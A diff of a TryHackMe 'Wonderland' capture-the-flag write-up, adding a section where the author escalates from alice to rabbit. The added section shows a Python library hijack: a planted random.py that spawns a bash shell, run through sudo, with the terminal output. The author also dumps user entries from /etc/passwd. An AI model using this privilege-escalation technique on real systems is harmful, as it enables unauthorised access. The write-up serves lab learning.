@@ -99,7 +99,22 @@ examining the source code showed what appeared to be the ssh credentiels for the
 
 once I got on the box, I found a file called `root.txt` which has the final flag we have to find, this seemed a bit weird since I haven't found the `user.txt` flag yet.
 
-after doing some enumeration I found a that I can execute a python script as another user, we can't edit the script thought
+I also found a python script that has the same poem we saw earlier on the website, sliced up to 10 parts. and script functionality was tp print a random part from them, oh and it also included the library `random`
+
+```python
+import random
+poem = """The sun was shining on the sea,
+Shining with all his might:
+OTHER PARTS OF THE POEM
+
+for i in range(10):
+    line = random.choice(poem.split("\n"))
+    print("The line was:\t", line)
+...
+
+```
+
+I found after doing some enumeration I found a that I can execute the script as another user, we can't edit it thought
 
 ```bash
 $ ssh alice@10.10.213.60
@@ -138,7 +153,7 @@ looking up the kernel version led me to try CVE-018-18955 on the box, which kind
 
 # I'll take care of this part later
 
-then I took a moment to find the `user.txt` flag, I ran couple `find` commands but nothing came up, I started running out of ideas till I viewed the hint on the website
+I took a moment to find the `user.txt` flag, I ran couple `find` commands but nothing came up, I started running out of ideas till I viewed the hint on the website
 
 ![upside down](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/wonder/upside_down.png)
 
@@ -153,3 +168,33 @@ alice@wonderland:~$ cat /root/user.txt
 thm{"REDACTED FLAG"}
 alice@wonderland:~$
 ```
+### escalating to rabbit
+
+examining `/etc/shadows` tells me that there 4 regular users on the box
+
+```bash
+tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
+hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
+rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
+```
+I already know I can execute a script as the user `rabbit` but didn't know that to do with that information, and with of lot of time passed doing other enumerations and I decided to peak at a write up, but hey let's keep that between me and you
+
+doing so I've learned 2 new things
+<li>
+    <ol> you can execute commands as another user using `sudo -u USER COMMAND`</ol>
+    <ol> python tries to find imported libraries in the current working directory before looking for them somewhere else, knowing this we can make a malicious `random.py` to elevate priveleges </ol>
+</li>
+
+of course, it's so obvious, *if* I had known those info before
+
+```bash
+alice@wonderland:~$ echo 'import pty;pty.spawn("/bin/bash")' > random.py
+alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
+[sudo] password for alice: 
+rabbit@wonderland:~$ whoami
+rabbit
+rabbit@wonderland:~$
+```
+
+### escalating to hatter
